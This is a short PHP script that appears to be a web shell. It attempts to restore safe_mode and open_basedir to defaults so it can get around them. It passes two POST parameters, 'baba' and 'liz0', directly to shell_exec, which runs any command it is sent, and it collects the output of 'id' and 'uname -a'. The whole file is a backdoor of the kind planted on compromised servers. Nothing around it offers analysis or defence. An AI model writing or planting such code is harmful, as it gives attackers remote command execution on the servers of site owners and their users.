<?php
ini_restore("safe_mode");
ini_restore("open_basedir");
$liz0=shell_exec($_POST['baba']); 
$liz0zim=shell_exec($_POST['liz0']); 
$uid=shell_exec('id');
$server=shell_exec('uname -a');

?>